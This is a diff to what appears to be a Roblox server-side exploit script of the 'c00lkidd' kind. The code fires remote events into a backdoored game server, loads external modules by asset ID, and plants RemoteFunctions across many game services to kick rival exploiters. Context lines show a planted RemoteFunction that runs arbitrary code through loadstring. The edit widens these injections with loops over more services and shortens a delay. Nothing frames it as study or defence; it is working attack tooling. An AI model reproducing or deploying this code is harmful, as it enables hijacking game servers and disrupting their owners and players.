@@ -3024,15 +3024,26 @@ end)
 		        fireRemoteEvent('require(7458325257).antiban()')
 			fireRemoteEvent('require(3986243232).load("im a skid",{"' .. game.Players.LocalPlayer.Name ..  '"})')
 			-- Layered protection
-			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.ReplicatedStorage;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
-			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.Workspace;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
-			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.Lighting;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
-			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.Players;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
-			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.SoundService;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
-			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.LocalizationService;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
-		    fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.Chat;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
-			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.Teams;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
-			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.FeatureRestrictionManager;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
+			fireRemoteEvent([[
+	local services = {
+    game:GetService("PathfindingService"),
+    game:GetService("PolicyService"),
+    game:GetService("TestService"),
+    game:GetService("Debris"),
+    game:GetService("SoundService"),
+    game:GetService("LocalizationService"),
+    game:GetService("MarketplaceService"),
+    game:GetService("HttpService"),
+}
+
+for _, svc in ipairs(services) do
+    local r = Instance.new("RemoteFunction")
+    r.Name = "rbxAssetid_core__temp_3023g78"
+    r.OnServerInvoke = function(player)
+        player:Kick("Use c00lkidd ss you skid bozo!")
+    end
+    r.Parent = svc
+end]])
             local HttpService = game:GetService("HttpService")
             local HttpService = game:GetService("HttpService")
             local HttpService = game:GetService("HttpService")
@@ -3107,11 +3118,26 @@ r.OnServerInvoke = function(_, code)
    return loadstring(code)()
 end]])
 fireRemoteEvent([[
-					for _ = 1, 20 do 
-				       Instance.new("RemoteFunction", game.LocalizationService).Name = "rbx.bd_cssr6-01"
-				    end
+local services = {
+    game:GetService("PathfindingService"),
+    game:GetService("PolicyService"),
+    game:GetService("TestService"),
+    game:GetService("Debris"),
+    game:GetService("SoundService"),
+    game:GetService("LocalizationService"),
+    game:GetService("MarketplaceService"),
+    game:GetService("HttpService"),
+}
+
+for _, svc in ipairs(services) do
+  for i = 1, 5 do 
+    local r = Instance.new("RemoteFunction")
+    r.Name = "rbx.bd_cssr6-01"
+    r.Parent = svc
+  end
+end
 ]])
-wait(0.4)
+wait(0.2)
 fireRemoteEvent([[
 for i, v in ipairs(game:GetDescendants()) do 
    if v:IsA("RemoteEvent") then 
